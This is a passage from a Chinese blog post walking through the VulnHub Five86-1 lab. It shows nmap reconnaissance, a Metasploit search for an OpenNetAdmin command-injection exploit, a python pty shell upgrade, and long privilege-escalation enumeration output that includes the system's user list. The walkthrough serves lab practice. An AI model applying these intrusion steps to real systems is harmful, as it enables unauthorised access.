@@ -1,0 +1,3498 @@
+---
+title: "VulnHub-Five86-1"
+layout: post
+date: 2021-12-29 20:31
+image: 
+headerImage: false
+tag:
+- web
+- vulnhub
+category: blog
+author: NoThxJ
+description: VulnHub
+---
+
+环境下载地址：<https://www.five86.com/five86-1.html>
+
+环境搭建：
+
+![1](https://havocykp.github.io/assets/images/img_blog12/1.png)
+
+信息收集
+
+探测目标IP
+
+netdiscover -r 192.168.101.0/24
+
+192.168.101.194
+
+![2](https://havocykp.github.io/assets/images/img_blog12/2.png)
+
+端口扫描
+
+开放了 22、80、10000端口
+
+```javascript
+┌─[✗]─[root@pendo]─[~]
+└──╼ #nmap -sT -sV -A -T5 192.168.101.194 -p-
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 09:45 CST
+Warning: 192.168.101.194 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.101.194
+Host is up (0.0092s latency).
+Not shown: 55462 closed ports, 10070 filtered ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
+|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
+|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/ona
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+MAC Address: 08:00:27:72:08:4B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   9.17 ms 192.168.101.194
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.01 seconds
+
+```
+
+ 
+
+```
+┌─[✗]─[root@pendo]─[~]
+└──╼ #nmap -sT -sV -A -T5 192.168.101.194 -p-
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 09:45 CST
+Warning: 192.168.101.194 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.101.194
+Host is up (0.0092s latency).
+Not shown: 55462 closed ports, 10070 filtered ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
+|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
+|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/ona
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+MAC Address: 08:00:27:72:08:4B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE
+HOP RTT     ADDRESS
+1   9.17 ms 192.168.101.194
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.01 seconds
+```
+
+根据端口扫描信息访问：
+
+[http://192.168.101.194](http://192.168.101.194:80)/robots.txt
+
+![37](https://havocykp.github.io/assets/images/img_blog12/37.png)
+
+<http://192.168.101.194/ona>
+
+![3](https://havocykp.github.io/assets/images/img_blog12/3.png)
+
+<https://192.168.101.194:10000>
+
+版本：MiniServ 1.920 服务：Webmin
+
+![4](https://havocykp.github.io/assets/images/img_blog12/4.png)
+
+解决：连接不是私密连接的问题
+
+<https://segmentfault.com/a/1190000040074507?utm_source=sf-similar-article>
+
+
+
+搜索该CMS（opennetadmin）是否有直接可利用的exp
+
+![5](https://havocykp.github.io/assets/images/img_blog12/5.png)
+
+查询该cms历史漏洞
+
+![6](https://havocykp.github.io/assets/images/img_blog12/6.png)
+
+```javascript
+┌─[root@pendo]─[~]
+└──╼ #msfconsole
+                                                  
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v6.0.44-dev                          ]
++ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: View advanced module options with 
+advanced
+
+msf6 > search opennetadmin
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/opennetadmin_ping_cmd_injection
+
+```
+
+![7](https://havocykp.github.io/assets/images/img_blog12/7.png)
+
+使用 模块打
+
+![8](https://havocykp.github.io/assets/images/img_blog12/8.png)
+
+配置模块
+
+![9](https://havocykp.github.io/assets/images/img_blog12/9.png)
+
+开始利用
+
+![10](https://havocykp.github.io/assets/images/img_blog12/10.png)
+
+shell进入，查看id为：www-data
+
+![11](https://havocykp.github.io/assets/images/img_blog12/11.png)
+
+进入靶机
+
+使用python反弹一个交互式shell TTY
+
+```javascript
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+![12](https://havocykp.github.io/assets/images/img_blog12/12.png)
+
+
+
+权限提升
+
+下载提权辅助工具
+
+```javascript
+// 枚举系统设置和执行一些提升权限的检查
+┌─[root@pendo]─[/home/pendo]
+└──╼ #wget --no-check-certificate https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
+```
+
+攻击机开启HTTP服务
+
+在当前路径开启 python.server，供靶机下载（开启http服务python3与python2有区别）
+
+```javascript
+命令：
+┌─[pendo@pendo]─[~]
+└──╼ $python -m http.server 9999
+```
+
+![13](https://havocykp.github.io/assets/images/img_blog12/13.png)
+
+使用wget下载linuxprivchecker.py脚本到靶机的 /tmp目录
+
+![14](https://havocykp.github.io/assets/images/img_blog12/14.png)
+
+便于查看收集到的信息，将结果输出到report.txt，然后使用less查看
+
+![15](https://havocykp.github.io/assets/images/img_blog12/15.png)
+
+检测内容：
+
+```javascript
+=======================================================================================
+
+        __    _                  ____       _       ________              __
+       / /   (_)___  __  ___  __/ __ \_____(_)   __/ ____/ /_  ___  _____/ /_____  _____
+      / /   / / __ \/ / / / |/_/ /_/ / ___/ / | / / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
+     / /___/ / / / / /_/ />  </ ____/ /  / /| |/ / /___/ / / /  __/ /__/ ,< /  __/ /
+    /_____/_/_/ /_/\__,_/_/|_/_/   /_/  /_/ |___/\____/_/ /_/\___/\___/_/|_|\___/_/
+
+    
+=======================================================================================
+
+[*] ENUMERATING USER AND ENVIRONMENTAL INFO...
+
+[+] List out any screens running for the current user
+[+] Logged in User Activity
+    system boot  Nov 13 20:34
+    run-level 5  Nov 13 20:34
+    LOGIN      tty1         Nov 13 20:34               390 id=tty1
+[+] Super Users Found:
+    root
+[+] Environment
+    USER=www-data
+    SHLVL=1
+    HOME=/var/www
+    OLDPWD=/opt/ona/www
+    _=/usr/bin/python
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
+    LANG=C
+    PWD=/tmp
+[+] Sudoers (privileged)
+[+] All users
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+    sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+    mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+    moss:x:1001:1001:Maurice Moss:/home/moss:/bin/bash
+    roy:x:1002:1002:Roy Trenneman:/home/roy:/bin/bash
+    jen:x:1003:1003:Jen Barber:/home/jen:/bin/bash
+    richmond:x:1004:1004:Richmond Avenal:/home/richmond:/bin/bash
+    douglas:x:1005:1005:Douglas Reynholm:/home/douglas:/bin/bash
+    Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin
+[+] Current User
+    www-data
+[+] Current User ID
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[*] GETTING BASIC SYSTEM INFO...
+
+[+] Kernel
+    Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11)
+[+] Hostname
+    five86-1
+[+] Operating System
+    Debian GNU/Linux 10 \n \l
+
+[*] GETTING NETWORKING INFO...
+
+[+] Interfaces
+[+] Netstat
+[+] Route(s)
+
+
+[*] ENUMERATING USER History Files..
+
+[+]  Try to get the contents of tdsql history file for current user
+[+]  Try to get the contents of nano history file for current user
+[+]  See if you have access too Root user history (depends on privs)
+[+]  Try to get the contents of python history file for current user
+[+]  Try to get the contents of mysql history file for current user
+[+]  Try to get the contents of atftp history file for current user
+[+]  Get the contents of bash history file for current user
+[+]  Try to get the contents of php history file for current user
+[+]  Try to get the contents of redis cli history file for current user
+
+
+[*] ENUMERATING USER *.rc Style Files For INFO...
+
+[+]  Get the contents of bash rc file form global config file
+[+]  Try to get the contents of mysql rc file for current user
+[+]  Try to get the contents of screen rc file for current user
+[+]  Try to get the contents of legacy net rc file for current user
+[+] Get the contents of bash rc file for current user
+[+] Try to get the contents of screen rc file form global config file
+[+]  Try to get the contents of vi rc file for current user
+
+[*] GETTING FILESYSTEM INFO...
+
+[+] Mount results
+    /dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
+    udev on /dev type devtmpfs (rw,nosuid,relatime,size=490744k,nr_inodes=122686,mode=755)
+    devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+    tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+    hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
+    mqueue on /dev/mqueue type mqueue (rw,relatime)
+    tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=101108k,mode=755)
+    tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
+    sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+    securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+    tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+    cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
+    cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+    cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
+    cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+    cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+    cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+    cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+    cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+    cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+    cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+    cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+    cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+    pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+    bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
+    debugfs on /sys/kernel/debug type debugfs (rw,relatime)
+    proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+    systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=36,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=10368)
+    /dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro)
+    /dev/sda1 on /var/tmp type ext4 (rw,relatime,errors=remount-ro)
+[+] fstab entries
+    # /etc/fstab: static file system information.
+    #
+    # Use 'blkid' to print the universally unique identifier for a
+    # device; this may be used with UUID= as a more robust way to name devices
+    # that works even if disks are added and removed. See fstab(5).
+    #
+    # <file system> <mount point>   <type>  <options>       <dump>  <pass>
+    # / was on /dev/sda1 during installation
+    UUID=e417deee-8aa8-47f7-bccb-8303b07f2835 /               ext4    errors=remount-ro 0       1
+    # swap was on /dev/sda5 during installation
+    UUID=d4a346be-600e-4c8b-a54d-3054f8c4e55c none            swap    sw              0       0
+    /dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+[+] Scheduled cron jobs
+    -rw-r--r-- 1 root root 1042 Jun 23  2019 /etc/crontab
+    /etc/cron.d:
+    total 16
+    drwxr-xr-x  2 root root 4096 Dec 31  2019 .
+    drwxr-xr-x 84 root root 4096 Nov 13 20:34 ..
+    -rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
+    -rw-r--r--  1 root root  712 Dec 17  2018 php
+    /etc/cron.daily:
+    total 52
+    drwxr-xr-x  2 root root 4096 Jan  1  2020 .
+    drwxr-xr-x 84 root root 4096 Nov 13 20:34 ..
+    -rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
+    -rwxr-xr-x  1 root root  539 Apr  2  2019 apache2
+    -rwxr-xr-x  1 root root 1478 May 28  2019 apt-compat
+    -rwxr-xr-x  1 root root   77 Feb 16  2019 apt-show-versions
+    -rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+    -rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
+    -rwxr-xr-x  1 root root 4128 Sep 27  2019 exim4-base
+    -rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
+    -rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
+    -rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
+    /etc/cron.hourly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Dec 31  2019 .
+    drwxr-xr-x 84 root root 4096 Nov 13 20:34 ..
+    -rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
+    /etc/cron.monthly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Dec 31  2019 .
+    drwxr-xr-x 84 root root 4096 Nov 13 20:34 ..
+    -rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
+    /etc/cron.weekly:
+    total 16
+    drwxr-xr-x  2 root root 4096 Dec 31  2019 .
+    drwxr-xr-x 84 root root 4096 Nov 13 20:34 ..
+    -rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
+    -rwxr-xr-x  1 root root  813 Feb 10  2019 man-db
+[+] Users cron jobs
+[+] Writable cron dirs
+
+[*] ENUMERATING PROCESSES AND APPLICATIONS...
+
+[+] Installed Packages
+    Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+    Err?=(none)/Reinst-required (Status,Err:
+    Name Version  Description
+    aajm 0.4-9+b2  ASCII art version of jugglemaster
+    adduser 3.118  add and remove users and groups
+    an 1.2-5  very fast anagram generator
+    angband 1:3.5.1-2.3  Single-player, text-based, dungeon simulation game
+    angband-data 1:3.5.1-2.3  Game data for angband
+    animals 201207131226-2.1  Traditional AI animal guessing engine using a binary tree DB
+    apache2 2.4.38-3+deb10u3  Apache HTTP Server
+    apache2-bin 2.4.38-3+deb10u3  Apache HTTP Server (modules and other binary files)
+    apache2-data 2.4.38-3+deb10u3  Apache HTTP Server (common files)
+    apache2-utils 2.4.38-3+deb10u3  Apache HTTP Server (utility programs for web servers)
+    apparmor 2.13.2-10  user-space parser utility for AppArmor
+    apt 1.8.2  commandline package manager
+    apt-listchanges 3.19  package change history notification tool
+    apt-show-versions 0.22.11  lists available package versions with distribution
+    apt-utils 1.8.2  package management related utility programs
+    asciijump 1.0.2~beta-10  Small and funny ASCII-art game about ski jumping
+    base-files 10.3+deb10u1  Debian base system miscellaneous files
+    base-passwd 3.5.46  Debian base system master password and group files
+    bash 5.0-4  GNU Bourne Again SHell
+    bash-completion 1:2.8-6  programmable completion for the bash shell
+    bastet 0.43-5+b1  ncurses Tetris clone with a bastard algorithm
+    bind9-host 1:9.11.5.P4+dfsg-5.1  DNS lookup utility (deprecated)
+    binutils 2.31.1-16  GNU assembler, linker and binary utilities
+    binutils-common:amd64 2.31.1-16  Common files for the GNU assembler, linker and binary utilities
+    binutils-x86-64-linux-gnu 2.31.1-16  GNU binary utilities, for x86-64-linux-gnu target
+    bombardier 0.8.3+nmu1+b3  The GNU Bombing utility
+    bsd-mailx 8.1.2-0.20180807cvs-1  simple mail user agent
+    bsdgames 2.17-28  collection of classic textual unix games
+    bsdmainutils 11.1.2+b1  collection of more utilities from FreeBSD
+    bsdutils 1:2.33.1-0.1  basic utilities from 4.4BSD-Lite
+    busybox 1:1.30.1-4  Tiny utilities for small and embedded systems
+    bzip2 1.0.6-9.2~deb10u1  high-quality block-sorting file compressor - utilities
+    ca-certificates 20190110  Common CA certificates
+    cavezofphear 0.5.1-1+b3  ASCII Boulder Dash clone
+    colossal-cave-adventure 1.4-1  Colossal Cave Adventure game
+    console-setup 1.193~deb10u1  console font and keymap setup program
+    console-setup-linux 1.193~deb10u1  Linux specific part of console-setup
+    coreutils 8.30-3  GNU core utilities
+    cpio 2.12+dfsg-9  GNU cpio -- a program to manage archives of files
+    crawl 2:0.23.0-1  Dungeon Crawl, a text-based roguelike game
+    crawl-common 2:0.23.0-1  Dungeon Crawl, a text-based roguelike game (data files)
+    cron 3.0pl1-134  process scheduling daemon
+    curseofwar 1.1.8-3+b3  Fast-paced action strategy game for Linux based on ncurses
+    dash 0.5.10.2-5  POSIX-compliant shell
+    dbus 1.12.16-1  simple interprocess messaging system (daemon and utilities)
+    debconf 1.5.71  Debian configuration management system
+    debconf-i18n 1.5.71  full internationalization support for debconf
+    debian-archive-keyring 2019.1  GnuPG archive keys of the Debian archive
+    debian-faq 9.0  Debian Frequently Asked Questions
+    debianutils 4.8.6.1  Miscellaneous utilities specific to Debian
+    dictionaries-common 1.28.1  spelling dictionaries - common utilities
+    diffutils 1:3.7-3  File comparison utilities
+    discover 2.1.2-8  hardware identification system
+    discover-data 2.2013.01.11  Data lists for Discover hardware detection system
+    distro-info-data 0.41  information about the distributions' releases (data files)
+    dmidecode 3.2-1  SMBIOS/DMI table decoder
+    dmsetup 2:1.02.155-3  Linux Kernel Device Mapper userspace library
+    doc-debian 6.4  Debian Project documentation and other documents
+    dpkg 1.19.7  Debian package management system
+    e2fsprogs 1.44.5-1+deb10u2  ext2/ext3/ext4 file system utilities
+    eject 2.1.5+deb1+cvs20081104-13.2  ejects CDs and operates CD-Changers under Linux
+    emacsen-common 3.0.4  Common facilities for all emacsen
+    empire 1.14-2  war game of the century
+    exim4 4.92-8+deb10u3  metapackage to ease Exim MTA (v4) installation
+    exim4-base 4.92-8+deb10u3  support files for all Exim MTA (v4) packages
+    exim4-config 4.92-8+deb10u3  configuration for the Exim MTA (v4)
+    exim4-daemon-light 4.92-8+deb10u3  lightweight Exim MTA (v4) daemon
+    fdisk 2.33.1-0.1  collection of partitioning utilities
+    file 1:5.35-4+deb10u1  Recognize the type of data in a file using "magic" numbers
+    findutils 4.6.0+git+20190209-2  utilities for finding files--find, xargs
+    firmware-linux-free 3.4  Binary firmware for various drivers in the Linux kernel
+    freesweep 1.0.1-1  text-based minesweeper
+    galera-3 25.3.25-2  Replication framework for transactional applications
+    games-console 3  Debian's console games
+    games-tasks 3  Debian Games tasks for tasksel
+    gawk 1:4.2.1+dfsg-1  GNU awk, a pattern scanning and processing language
+    gcc-8-base:amd64 8.3.0-6  GCC, the GNU Compiler Collection (base package)
+    gdbm-l10n 1.18.1-4  GNU dbm database routines (translation files)
+    gearhead 1.310-1  roguelike mecha role playing game, console version
+    gearhead-data 1.310-1  data files for gearhead
+    geoip-database 20181108-1  IP lookup command line tools that use the GeoIP library (country database)
+    gettext-base 0.19.8.1-9  GNU Internationalization utilities for the base system
+    git 1:2.20.1-2+deb10u1  fast, scalable, distributed revision control system
+    git-man 1:2.20.1-2+deb10u1  fast, scalable, distributed revision control system (manual pages)
+    gnugo 3.8-9+b3  play the game of Go
+    gnuminishogi 1.4.2-6  program to play minishogi, a shogi variant on a 5x5 board
+    gpgv 2.2.12-1+deb10u1  GNU privacy guard - signature verification tool
+    greed 4.2-1  curses-based clone of the DOS free-ware game Greed
+    grep 3.3-1  GNU grep, egrep and fgrep
+    groff-base 1.22.4-3  GNU troff text-formatting system (base system components)
+    grub-common 2.02+dfsg1-20  GRand Unified Bootloader (common files)
+    grub-pc 2.02+dfsg1-20  GRand Unified Bootloader, version 2 (PC/BIOS version)
+    grub-pc-bin 2.02+dfsg1-20  GRand Unified Bootloader, version 2 (PC/BIOS modules)
+    grub2-common 2.02+dfsg1-20  GRand Unified Bootloader (common files for version 2)
+    guile-2.2-libs:amd64 2.2.4+1-2  Core Guile libraries
+    gzip 1.9-3  GNU compression utilities
+    hdparm 9.58+ds-1  tune hard disk parameters for high performance
+    hostname 3.21  utility to set/show the host name or domain name
+    iamerican 3.4.00-6  American English dictionary for ispell (standard version)
+    ibritish 3.4.00-6  British English dictionary for ispell (standard version)
+    ienglish-common 3.4.00-6  Common files for British and American ispell dictionaries
+    ifupdown 0.8.35  high level tools to configure network interfaces
+    init 1.56+nmu1  metapackage ensuring an init system is installed
+    init-system-helpers 1.56+nmu1  helper tools for all init systems
+    initramfs-tools 0.133+deb10u1  generic modular initramfs generator (automation)
+    initramfs-tools-core 0.133+deb10u1  generic modular initramfs generator (core tools)
+    installation-report 2.71  system installation report
+    iproute2 4.20.0-2  networking and traffic control tools
+    iptables 1.8.2-4  administration tools for packet filtering and NAT
+    iptables-persistent 1.0.11  boot-time loader for netfilter rules, iptables plugin
+    iputils-ping 3:20180629-2  Tools to test the reachability of network hosts
+    isc-dhcp-client 4.4.1-2  DHCP client for automatically obtaining an IP address
+    isc-dhcp-common 4.4.1-2  common manpages relevant to all of the isc-dhcp packages
+    iso-codes 4.2-1  ISO language, territory, currency, script codes and their translations
+    ispell 3.4.00-6+b1  International Ispell (an interactive spelling corrector)
+    kbd 2.0.4-4  Linux console font and keytable utilities
+    keyboard-configuration 1.193~deb10u1  system-wide keyboard preferences
+    klibc-utils 2.0.6-1  small utilities built with klibc for early boot
+    kmod 26-1  tools for managing Linux kernel modules
+    krb5-locales 1.17-3  internationalization support for MIT Kerberos
+    laptop-detect 0.16  system chassis type checker
+    less 487-0.1+b1  pager program similar to more
+    libaa1:amd64 1.4p5-46  ASCII art library
+    libacl1:amd64 2.2.53-4  access control list - shared library
+    libaio1:amd64 0.3.112-3  Linux kernel AIO access library - shared library
+    libapache2-mod-php 2:7.3+69  server-side, HTML-embedded scripting language (Apache 2 module) (default)
+    libapache2-mod-php7.3 7.3.11-1~deb10u1  server-side, HTML-embedded scripting language (Apache 2 module)
+    libapparmor1:amd64 2.13.2-10  changehat AppArmor library
+    libapr1:amd64 1.6.5-1+b1  Apache Portable Runtime Library
+    libaprutil1:amd64 1.6.1-4  Apache Portable Runtime Utility Library
+    libaprutil1-dbd-sqlite3:amd64 1.6.1-4  Apache Portable Runtime Utility Library - SQLite3 Driver
+    libaprutil1-ldap:amd64 1.6.1-4  Apache Portable Runtime Utility Library - LDAP Driver
+    libapt-inst2.0:amd64 1.8.2  deb package format runtime library
+    libapt-pkg-perl 0.1.34+b1  Perl interface to libapt-pkg
+    libapt-pkg5.0:amd64 1.8.2  package management runtime library
+    libargon2-1:amd64 0~20171227-0.2  memory-hard hashing function - runtime library
+    libasound2:amd64 1.1.8-1  shared library for ALSA applications
+    libasound2-data 1.1.8-1  Configuration files and profiles for ALSA drivers
+    libasyncns0:amd64 0.8-6  Asynchronous name service query library
+    libatomic1:amd64 8.3.0-6  support library providing __atomic built-in functions
+    libattr1:amd64 1:2.4.48-4  extended attribute handling - shared library
+    libaudit-common 1:2.8.4-3  Dynamic library for security auditing - common files
+    libaudit1:amd64 1:2.8.4-3  Dynamic library for security auditing
+    libauthen-pam-perl 0.16-3+b6  Perl interface to PAM library
+    libbind9-161:amd64 1:9.11.5.P4+dfsg-5.1  BIND9 Shared Library used by BIND
+    libbinutils:amd64 2.31.1-16  GNU binary utilities (private shared library)
+    libblkid1:amd64 2.33.1-0.1  block device ID library
+    libboost-program-options1.67.0:amd64 1.67.0-13  program options library for C++
+    libbrotli1:amd64 1.0.7-2  library implementing brotli encoder and decoder (shared libraries)
+    libbsd0:amd64 0.9.1-2  utility functions from BSD systems - shared library
+    libbz2-1.0:amd64 1.0.6-9.2~deb10u1  high-quality block-sorting file compressor library - runtime
+    libc-bin 2.28-10  GNU C Library: Binaries
+    libc-l10n 2.28-10  GNU C Library: localization files
+    libc6:amd64 2.28-10  GNU C Library: Shared libraries
+    libcaca0:amd64 0.99.beta19-2.1  colour ASCII art library
+    libcap-ng0:amd64 0.7.9-2  An alternate POSIX capabilities library
+    libcap2:amd64 1:2.25-2  POSIX 1003.1e capabilities (library)
+    libcap2-bin 1:2.25-2  POSIX 1003.1e capabilities (utilities)
+    libcgi-fast-perl 1:2.13-1  CGI subclass for work with FCGI
+    libcgi-pm-perl 4.40-1  module for Common Gateway Interface applications
+    libcom-err2:amd64 1.44.5-1+deb10u2  common error description library
+    libconfig-inifiles-perl 3.000001-1  read .ini-style configuration files
+    libcryptsetup12:amd64 2:2.1.0-5+deb10u2  disk encryption support - shared library
+    libcurl3-gnutls:amd64 7.64.0-4  easy-to-use client-side URL transfer library (GnuTLS flavour)
+    libcurl4:amd64 7.64.0-4  easy-to-use client-side URL transfer library (OpenSSL flavour)
+    libdb5.3:amd64 5.3.28+dfsg1-0.5  Berkeley v5.3 Database Libraries [runtime]
+    libdb5.3++:amd64 5.3.28+dfsg1-0.5  Berkeley v5.3 Database Libraries for C++ [runtime]
+    libdbd-mysql-perl:amd64 4.050-2  Perl5 database interface to the MariaDB/MySQL database
+    libdbi-perl:amd64 1.642-1+b1  Perl Database Interface (DBI)
+    libdbus-1-3:amd64 1.12.16-1  simple interprocess messaging system (library)
+    libdebconfclient0:amd64 0.249  Debian Configuration Management System (C-implementation library)
+    libdevmapper1.02.1:amd64 2:1.02.155-3  Linux Kernel Device Mapper userspace library
+    libdiscover2 2.1.2-8  hardware identification library
+    libdns-export1104 1:9.11.5.P4+dfsg-5.1  Exported DNS Shared Library
+    libdns1104:amd64 1:9.11.5.P4+dfsg-5.1  DNS Shared Library used by BIND
+    libedit2:amd64 3.1-20181209-1  BSD editline and history libraries
+    libefiboot1:amd64 37-2  Library to manage UEFI variables
+    libefivar1:amd64 37-2  Library to manage UEFI variables
+    libelf1:amd64 0.176-1.1  library to read and write ELF files
+    libencode-locale-perl 1.05-1  utility to determine the locale encoding
